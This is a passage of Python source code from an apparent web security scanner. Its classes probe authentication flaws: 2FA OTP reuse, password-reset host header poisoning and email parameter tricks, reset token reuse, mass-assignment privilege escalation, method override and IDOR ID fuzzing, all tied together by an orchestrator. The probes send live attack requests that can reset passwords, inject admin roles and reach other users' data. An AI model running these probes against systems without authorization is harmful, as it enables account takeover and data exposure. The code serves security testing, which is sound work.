                if sim > 0.95:
                    return {
                        "vuln_type": "2FA OTP Reuse Possible",
                        "url": two_fa_url, "severity": "High",
                        "description": (
                            "Same OTP code accepted on second submission with identical responses. "
                            "OTP should be invalidated after first use."
                        ),
                        "evidence": {"otp": canary, "r1_status": r1.status_code,
                                     "r2_status": r2.status_code, "similarity": round(sim, 3)},
                    }
        except Exception as exc:
            _logger6.debug("[2FA] OTP reuse: %s", exc)
        return None

    def _try_response_manipulation(self, two_fa_url: str) -> Optional[Dict]:
        """Check if success/fail can be flipped by modifying response keys."""
        # Sends wrong code and checks if response JSON has a 'success: false' style field
        try:
            r = self.session.post(two_fa_url,
                                  data={"otp": "000000", "code": "000000"},
                                  headers={"Accept": "application/json"}, timeout=8)
            if r.headers.get("content-type", "").startswith("application/json"):
                body = r.text or ""
                if '"success":false' in body or '"verified":false' in body or '"valid":false' in body:
                    return {
                        "vuln_type": "2FA Response Manipulation Risk",
                        "url": two_fa_url, "severity": "Medium",
                        "description": (
                            "2FA verification result is reflected as a client-side JSON boolean. "
                            "If client enforces this, attacker with proxy can flip 'false' to 'true'."
                        ),
                        "evidence": {"response_snippet": body[:200]},
                    }
        except Exception as exc:
            _logger6.debug("[2FA] response manipulation: %s", exc)
        return None


# ===========================================================================
# 4. PasswordResetAttacker
# ===========================================================================
class PasswordResetAttacker(BaseScanner):
    """
    Password reset flow saldiri yüzeyi:
      - Host header injection (reset link poisoning)
      - Token tahmin edilebilirlik (entropi, uzunluk, zaman-tabanli)
      - Token yeniden kullanimi (single-use kontrolü)
      - Paralel reset yarisi (race condition)
      - Email parametre manipülasyonu (array, null byte, CRLF)
    """
    name = "password_reset_attacker"

    _RESET_PATHS = [
        "/forgot-password", "/forgot_password", "/reset-password",
        "/auth/reset", "/api/auth/password/reset", "/password/reset",
        "/account/forgot", "/users/password", "/api/password/forgot",
    ]

    def run(self, target: str, email: str = "test@example.com", **kwargs) -> List[Dict]:
        results: List[Dict] = []
        reset_url = self._find_reset_endpoint(target)
        if not reset_url:
            _logger6.info("[PassReset] No reset endpoint found")
            return results

        # 1. Host header injection
        for finding in self._probe_host_header_injection(reset_url, email):
            results.append(finding)
            self.report_finding(**finding)

        # 2. Email parameter manipulation
        for finding in self._probe_email_param_manipulation(reset_url, email):
            results.append(finding)
            self.report_finding(**finding)

        # 3. Token entropy analysis
        entropy_result = self._analyze_token_entropy(reset_url, email)
        if entropy_result:
            results.append(entropy_result)
            self.report_finding(**entropy_result)

        # 4. Token reuse
        reuse = self._probe_token_reuse(reset_url, email)
        if reuse:
            results.append(reuse)
            self.report_finding(**reuse)

        return results

    def _find_reset_endpoint(self, base: str) -> Optional[str]:
        for path in self._RESET_PATHS:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (404, 410):
                    return url
            except Exception:
                pass
        return None

    def _probe_host_header_injection(self, reset_url: str, email: str) -> List[Dict]:
        results = []
        for hdr in _RESET_HEADERS:
            evil_host = f"evil-{_random_str(4)}.{_OOB_HOST}"
            poison_headers = {hdr: evil_host}
            if hdr == "Forwarded":
                poison_headers[hdr] = f"host={evil_host}"
            try:
                r = self.session.post(
                    reset_url,
                    data={"email": email},
                    headers=poison_headers,
                    timeout=8,
                )
                body = (r.text or "").lower()
                # Reflection in response = confirmed poison
                if evil_host in (r.text or "") or evil_host in str(r.headers):
                    results.append({
                        "vuln_type": "Password Reset Host Header Injection",
                        "url": reset_url, "severity": "Critical",
                        "description": (
                            f"Reset endpoint reflected the poisoned '{hdr}: {evil_host}' in response. "
                            "Reset link in email will point to attacker-controlled host."
                        ),
                        "evidence": {"header": hdr, "evil_host": evil_host,
                                     "status": r.status_code, "reflection": True},
                    })
                    break
                # Heuristic: no error on a weird host = likely using it
                if r.status_code == 200 and "error" not in body[:200]:
                    results.append({
                        "vuln_type": "Password Reset Host Header Injection (Probable)",
                        "url": reset_url, "severity": "High",
                        "description": (
                            f"Reset endpoint accepted request with '{hdr}: {evil_host}' without error. "
                            "Reset link may embed attacker host if header is trusted."
                        ),
                        "evidence": {"header": hdr, "evil_host": evil_host, "status": r.status_code},
                    })
            except Exception as exc:
                _logger6.debug("[PassReset] host header injection: %s", exc)
        return results

    def _probe_email_param_manipulation(self, reset_url: str, email: str) -> List[Dict]:
        """Test email param tricks: array, duplicate, CRLF."""
        results = []
        victim  = email
        attacker = f"attacker-{_random_str(4)}@evil.invalid"
        variants = [
            # Duplicate email param (some frameworks use last)
            (f"{reset_url}?email={victim}&email={attacker}", "duplicate_param"),
            (f"{reset_url}?email[]={victim}&email[]={attacker}", "array_param"),
        ]
        for test_url, technique in variants:
            try:
                r = self.session.post(test_url, data={"email": victim}, timeout=8)
                if r.status_code == 200:
                    results.append({
                        "vuln_type": f"Password Reset Email Param Manipulation ({technique})",
                        "url": test_url, "severity": "High",
                        "description": (
                            f"Reset accepted with {technique} — server may send reset link "
                            f"to attacker address ({attacker}) while appearing to reset victim account."
                        ),
                        "evidence": {"technique": technique, "status": r.status_code},
                    })
            except Exception as exc:
                _logger6.debug("[PassReset] email manipulation: %s", exc)
        return results

    def _analyze_token_entropy(self, reset_url: str, email: str) -> Optional[Dict]:
        """Request two reset tokens and compare entropy."""
        tokens = []
        for _ in range(2):
            try:
                r = self.session.post(reset_url, data={"email": email}, timeout=8)
                # Try to extract token from response (redirect or body)
                loc = r.headers.get("location", "")
                token_match = re.search(r"[?&]token=([A-Za-z0-9_\-]{6,})", loc + (r.text or ""))
                if token_match:
                    tokens.append(token_match.group(1))
            except Exception:
                pass
        if len(tokens) < 2:
            return None
        t1, t2 = tokens
        if t1 == t2:
            return {
                "vuln_type": "Password Reset Token Reuse (Identical Tokens)",
                "url": reset_url, "severity": "Critical",
                "description": "Two successive password reset requests returned identical tokens.",
                "evidence": {"token1": t1[:8] + "...", "token2": t2[:8] + "..."},
            }
        # Entropy check
        if len(t1) < 16:
            return {
                "vuln_type": "Password Reset Token Low Entropy",
                "url": reset_url, "severity": "High",
                "description": (
                    f"Reset token length is only {len(t1)} characters. "
                    "Tokens should be at least 32 characters of cryptographic randomness."
                ),
                "evidence": {"token_length": len(t1), "sample": t1[:8] + "..."},
            }
        return None

    def _probe_token_reuse(self, reset_url: str, email: str) -> Optional[Dict]:
        """Check if the same token can be used multiple times."""
        # First get a token
        try:
            r = self.session.post(reset_url, data={"email": email}, timeout=8)
            loc = r.headers.get("location", "") + (r.text or "")
            m = re.search(r"[?&]token=([A-Za-z0-9_\-]{16,})", loc)
            if not m:
                return None
            token = m.group(1)
            # Try to use it twice
            confirm_url = re.sub(r"(.*)/forgot.*", r"\1/reset-password", reset_url)
            payload = {"token": token, "password": "NewPass123!", "password_confirmation": "NewPass123!"}
            r1 = self.session.post(confirm_url, data=payload, timeout=8)
            r2 = self.session.post(confirm_url, data=payload, timeout=8)
            if r2.status_code == 200 and "invalid" not in (r2.text or "").lower()[:100]:
                return {
                    "vuln_type": "Password Reset Token Single-Use Not Enforced",
                    "url": confirm_url, "severity": "Critical",
                    "description": "Password reset token accepted on second use. Tokens must be invalidated after use.",
                    "evidence": {"token": token[:8] + "...", "second_use_status": r2.status_code},
                }
        except Exception as exc:
            _logger6.debug("[PassReset] token reuse: %s", exc)
        return None


# ===========================================================================
# 5. PrivilegeEscalationProber
# ===========================================================================
class PrivilegeEscalationProber(BaseScanner):
    """
    Privilege escalation otomasyonu:
      - Kullanici tokeni ile admin endpoint testi (vertical PrivEsc)
      - Rol parametresi manipülasyonu (JSON body / query param)
      - Mass assignment zafiyeti (admin flag enjeksiyonu)
      - HTTP method override (GET -> PUT/DELETE via X-HTTP-Method-Override)
    """
    name = "privilege_escalation"

    _ROLE_ESCALATION_FIELDS = [
        "role", "roles", "is_admin", "admin", "scope", "permissions",
        "group", "groups", "privilege", "access_level", "user_type",
    ]

    def run(self, target: str, user_token: Optional[str] = None,
            endpoints: Optional[List[str]] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        all_endpoints = endpoints or _ADMIN_ENDPOINTS
        headers = {}
        if user_token:
            headers["Authorization"] = f"Bearer {user_token}"

        for path in all_endpoints:
            url = urljoin(target.rstrip("/") + "/", path.lstrip("/"))

            # 1. Vertical PrivEsc — direct access
            vert = self._probe_vertical(url, headers)
            if vert:
                results.append(vert)
                self.report_finding(**vert)

            # 2. Mass assignment — inject admin flags
            mass = self._probe_mass_assignment(url, headers)
            if mass:
                results.append(mass)
                self.report_finding(**mass)

            # 3. Method override
            override = self._probe_method_override(url, headers)
            if override:
                results.append(override)
                self.report_finding(**override)

        return results

    def _probe_vertical(self, url: str, auth_headers: Dict) -> Optional[Dict]:
        """Access admin endpoint with user-level token."""
        try:
            anon_resp = self.session.get(url, timeout=8)
            auth_resp = self.session.get(url, headers=auth_headers, timeout=8)
            # Auth gives access but anon doesn't = admin endpoint leaks
            if anon_resp.status_code in (401, 403) and auth_resp.status_code == 200:
                if not _is_auth_error(auth_resp):
                    sim = _response_similarity(anon_resp, auth_resp)
                    if sim < 0.7:
                        return {
                            "vuln_type": "Vertical Privilege Escalation",
                            "url": url, "severity": "Critical",
                            "description": (
                                f"Admin endpoint '{url}' accessible with a low-privilege token. "
                                "Anon returns 401/403, user-level token returns 200."
                            ),
                            "evidence": {"anon_status": anon_resp.status_code,
                                         "user_status": auth_resp.status_code,
                                         "similarity": round(sim, 3)},
                        }
        except Exception as exc:
            _logger6.debug("[PrivEsc] vertical: %s", exc)
        return None

    def _probe_mass_assignment(self, url: str, auth_headers: Dict) -> Optional[Dict]:
        """POST/PUT with extra admin fields injected."""
        for field in self._ROLE_ESCALATION_FIELDS[:4]:
            for val in ["admin", True, 1, "superuser"]:
                payload = {field: val, "username": "test", "email": "test@example.com"}
                try:
                    r = self.session.post(url, json=payload, headers=auth_headers, timeout=8)
                    if r.status_code in (200, 201):
                        body = (r.text or "").lower()
                        if field in body and any(str(v) in body for v in [val, "admin", "true"]):
                            return {
                                "vuln_type": "Mass Assignment — Privilege Escalation",
                                "url": url, "severity": "Critical",
                                "description": (
                                    f"Server accepted '{field}={val}' in POST body and reflected it. "
                                    "Mass assignment may allow role escalation."
                                ),
                                "evidence": {"field": field, "value": str(val),
                                             "status": r.status_code, "body_snippet": body[:150]},
                            }
                except Exception:
                    pass
        return None

    def _probe_method_override(self, url: str, auth_headers: Dict) -> Optional[Dict]:
        """Try HTTP method override to bypass GET-only restrictions."""
        override_headers_list = [
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method": "DELETE"},
            {"X-Method-Override": "PUT"},
        ]
        for extra_hdrs in override_headers_list:
            hdrs = {**auth_headers, **extra_hdrs}
            try:
                r = self.session.get(url, headers=hdrs, timeout=8)
                if r.status_code in (200, 204):
                    return {
                        "vuln_type": "HTTP Method Override Bypass",
                        "url": url, "severity": "High",
                        "description": (
                            f"Server honored '{list(extra_hdrs.keys())[0]}' override header. "
                            "GET request processed as DELETE/PUT — authorization bypass possible."
                        ),
                        "evidence": {"override_header": extra_hdrs, "status": r.status_code},
                    }
            except Exception:
                pass
        return None


# ===========================================================================
# 6. BOLAIDORChain
# ===========================================================================
class BOLAIDORChain(BaseScanner):
    """
    BOLA / IDOR tam otomasyon zinciri:
      - Numeric ID fuzzing (±1, ±5, ±100, random large)
      - UUID/GUID enumeration (v1 timestamp prediction)
      - Response comparison (unauthorized vs authorized user)
      - Cross-user resource access detection
      - Horizontal PrivEsc: user A token -> user B resource
    """
    name = "bola_idor"

    _ID_PARAMS = [
        "id", "user_id", "userId", "account_id", "order_id",
        "invoice_id", "document_id", "file_id", "record_id",
        "profile_id", "customer_id", "uid", "oid",
    ]

    _UUID_V1_RE = re.compile(
        r"[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}",
        re.IGNORECASE,
    )

    def run(self, target: str,
            victim_token: Optional[str] = None,
            attacker_token: Optional[str] = None,
            endpoints: Optional[List[str]] = None,
            **kwargs) -> List[Dict]:
        results: List[Dict] = []
        victim_hdrs   = {"Authorization": f"Bearer {victim_token}"}   if victim_token   else {}
        attacker_hdrs = {"Authorization": f"Bearer {attacker_token}"} if attacker_token else {}
        parsed = urlparse(target)
        all_endpoints = endpoints or self._discover_id_endpoints(target, victim_hdrs)

        for ep in all_endpoints:
            # 1. Numeric ID fuzzing
            for finding in self._fuzz_numeric_id(ep, victim_hdrs, attacker_hdrs):
                results.append(finding)
                self.report_finding(**finding)

            # 2. UUID enumeration
            for finding in self._fuzz_uuid(ep, victim_hdrs, attacker_hdrs):
                results.append(finding)
                self.report_finding(**finding)

            # 3. Direct object reference in query param
            for finding in self._probe_query_params(ep, victim_hdrs, attacker_hdrs):
                results.append(finding)
                self.report_finding(**finding)

        return results

    def _discover_id_endpoints(self, base: str, headers: Dict) -> List[str]:
        """Find endpoints with ID patterns in path or response."""
        candidates = [
            "/api/v1/users/{id}", "/api/v1/accounts/{id}", "/api/v1/orders/{id}",
            "/api/users/{id}", "/api/orders/{id}", "/api/documents/{id}",
            "/users/{id}", "/accounts/{id}", "/profile/{id}",
        ]
        parsed = urlparse(base)
        found  = []
        for tpl in candidates:
            for test_id in [1, 2, 100]:
                url = urljoin(base.rstrip("/") + "/", tpl.replace("{id}", str(test_id)).lstrip("/"))
                try:
                    r = self.session.get(url, headers=headers, timeout=5)
                    if r.status_code not in (404, 410):
                        # Store the template
                        found.append(url)
                        break
                except Exception:
                    pass
        return found or [base]

    def _fuzz_numeric_id(self, endpoint: str, victim_hdrs: Dict, attacker_hdrs: Dict) -> List[Dict]:
        """Replace numeric IDs in path with neighbor values."""
        results = []
        # Extract numeric ID from path
        m = re.search(r"/(\d{1,10})(/|$|\?)", endpoint)
        if not m:
            return results
        original_id = int(m.group(1))
        test_ids = [
            original_id - 1, original_id + 1, original_id - 2, original_id + 2,
            original_id + 100, original_id - 100,
            random.randint(1, 9999), random.randint(10000, 99999),
        ]
        # Baseline: victim accessing own resource
        try:
            baseline = self.session.get(endpoint, headers=victim_hdrs, timeout=8)
        except Exception:
            return results
        for fuzz_id in test_ids:
            if fuzz_id <= 0:
                continue
            fuzz_url = endpoint[:m.start(1)] + str(fuzz_id) + endpoint[m.end(1) - 1 if endpoint[m.end(1)-1:m.end(1)] in ('/', '?') else m.end(1):]
            try:
                # With attacker token (different user)
                if attacker_hdrs:
                    r_atk = self.session.get(fuzz_url, headers=attacker_hdrs, timeout=8)
                    if r_atk.status_code == 200 and not _is_auth_error(r_atk):
                        sim = _response_similarity(baseline, r_atk)
                        if sim > 0.5:
                            results.append({
                                "vuln_type": "BOLA/IDOR — Cross-User Resource Access",
                                "url": fuzz_url, "severity": "High",
                                "description": (
                                    f"Attacker token accessed resource ID {fuzz_id} (owned by another user). "
                                    "Broken Object Level Authorization confirmed."
                                ),
                                "evidence": {"original_id": original_id, "fuzz_id": fuzz_id,
                                             "attacker_status": r_atk.status_code,
                                             "similarity": round(sim, 3)},
                            })
                            break
                # Without any auth (unauthenticated access)
                else:
                    r_anon = self.session.get(fuzz_url, timeout=8)
                    if r_anon.status_code == 200 and not _is_auth_error(r_anon):
                        results.append({
                            "vuln_type": "IDOR — Unauthenticated Resource Access",
                            "url": fuzz_url, "severity": "Critical",
                            "description": f"Resource ID {fuzz_id} accessible without authentication.",
                            "evidence": {"fuzz_id": fuzz_id, "status": r_anon.status_code},
                        })
                        break
            except Exception as exc:
                _logger6.debug("[BOLA] fuzz numeric: %s", exc)
        return results

    def _fuzz_uuid(self, endpoint: str, victim_hdrs: Dict, attacker_hdrs: Dict) -> List[Dict]:
        """Replace UUID v1 in path (predictable timestamp-based)."""
        results = []
        m = self._UUID_V1_RE.search(endpoint)
        if not m:
            return results
        original_uuid = m.group(0)
        # Generate nearby UUIDs (v4 random for simplicity)
        test_uuids = [str(uuid.uuid4()) for _ in range(5)]
        for test_uuid in test_uuids:
            fuzz_url = endpoint[:m.start()] + test_uuid + endpoint[m.end():]
            try:
                r = self.session.get(fuzz_url, headers=attacker_hdrs or victim_hdrs, timeout=8)
                if r.status_code == 200 and not _is_auth_error(r):
                    results.append({
                        "vuln_type": "IDOR — UUID Resource Enumeration",
                        "url": fuzz_url, "severity": "High",
                        "description": (
                            f"Random UUID-based resource accessible: {test_uuid}. "
                            "UUIDs may be guessable or enumerable."
                        ),
                        "evidence": {"original_uuid": original_uuid, "test_uuid": test_uuid,
                                     "status": r.status_code},
                    })
                    break
            except Exception as exc:
                _logger6.debug("[BOLA] UUID fuzz: %s", exc)
        return results

    def _probe_query_params(self, endpoint: str, victim_hdrs: Dict, attacker_hdrs: Dict) -> List[Dict]:
        """Inject ID params into query string."""
        results = []
        parsed  = urlparse(endpoint)
        qs_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        id_pairs = [(k, v) for k, v in qs_pairs if k.lower() in self._ID_PARAMS]
        if not id_pairs:
            # Inject common ID params
            for id_param in self._ID_PARAMS[:3]:
                for test_id in [1, 2, 999]:
                    fuzz_qs  = urlencode(list(qs_pairs) + [(id_param, test_id)])
                    fuzz_url = urlunparse(parsed._replace(query=fuzz_qs))
                    try:
                        r = self.session.get(fuzz_url, headers=attacker_hdrs or victim_hdrs, timeout=8)
                        if r.status_code == 200 and not _is_auth_error(r):
                            body = (r.text or "")
                            if len(body) > 50:
                                results.append({
                                    "vuln_type": "IDOR — Query Param ID Injection",
                                    "url": fuzz_url, "severity": "Medium",
                                    "description": (
                                        f"Endpoint returned 200 with injected '{id_param}={test_id}'. "
                                        "May expose other users' data."
                                    ),
                                    "evidence": {"param": id_param, "id": test_id,
                                                 "status": r.status_code, "body_len": len(body)},
                                })
                    except Exception:
                        pass
        return results


# ===========================================================================
# AuthAdim6Scanner — Orchestrator (tum 6 zinciri koordine eder)
# ===========================================================================
class AuthAdim6Scanner(BaseScanner):
    """
    Adim 6 orchestrator: tum auth saldiri zincirlerini tek run() ile calistirir.
    CRLFScanner gibi her sub-scanner'i sirayla tetikler.
    """
    name = "auth_adim6"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        scanners = [
            OAuth2AttackSurface(session=self.session, results=self.results),
            SAMLInjector(session=self.session, results=self.results),
            TwoFABypassProber(session=self.session, results=self.results),
            PasswordResetAttacker(session=self.session, results=self.results),
            PrivilegeEscalationProber(session=self.session, results=self.results),
            BOLAIDORChain(session=self.session, results=self.results),
        ]
        for scanner in scanners:
            try:
                scanner.target = target
                res = scanner.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                _logger6.warning("[AuthAdim6] %s failed: %s", scanner.name, exc)
        return all_results

